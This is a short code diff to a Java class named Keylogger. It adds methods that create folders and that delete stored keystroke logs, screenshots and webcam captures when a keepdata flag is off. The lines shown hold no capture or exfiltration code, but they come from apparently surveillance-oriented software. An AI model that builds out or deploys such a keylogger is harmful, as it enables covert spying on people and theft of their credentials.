@@ -86,4 +86,25 @@ public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
         }
     }
 
+    public static void createFolder(String path){
+        new File(path).mkdir();
+    }
+
+    private static void deleteFolder(String path){
+        File folder = new File(path);
+        File[] files = folder.listFiles();
+        for (File file: files) {
+            file.delete();
+        }
+    }
+
+    private static void deleteData(){
+        if (!keepdata) {
+            deleteFolder(app_path + path_logs);
+            deleteFolder(app_path + path_screenshot);
+            deleteFolder(app_path + path_cam);
+        }
+    }
+
+    
 }
